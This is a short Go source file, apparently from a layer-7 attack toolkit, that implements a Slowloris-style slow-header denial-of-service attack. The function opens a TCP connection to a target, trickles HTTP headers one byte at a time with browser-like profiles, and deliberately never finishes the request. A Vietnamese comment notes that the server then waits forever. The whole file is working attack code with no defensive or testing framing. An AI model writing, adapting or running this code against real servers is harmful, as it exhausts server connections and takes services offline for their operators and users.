package l7

import (
	"context"
	"net"
	"time"
)

func SlowHeader(ctx context.Context, host string, profile Profile, interval int, stop <-chan struct{}) error {
	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	parts := []string{
		"GET / HTTP/1.1\r\n",
		"Host: " + host + "\r\n",
		"User-Agent: " + profile.UserAgent + "\r\n",
		"Accept: " + profile.Accept + "\r\n",
		"Accept-Language: " + profile.AcceptLanguage + "\r\n",
		"Accept-Encoding: " + profile.AcceptEncoding + "\r\n",
		"Connection: keep-alive\r\n",
	}

	for _, p := range parts {
		for _, b := range []byte(p) {
			select {
			case <-ctx.Done():
				return nil
			case <-stop:
				return nil
			default:
			}
			if _, err := conn.Write([]byte{b}); err != nil {
				return err
			}
			time.Sleep(time.Duration(interval) * time.Millisecond)
		}
	}

	// không gửi \r\n cuối -> server chờ mãi
	<-ctx.Done()
	return nil
}
//oke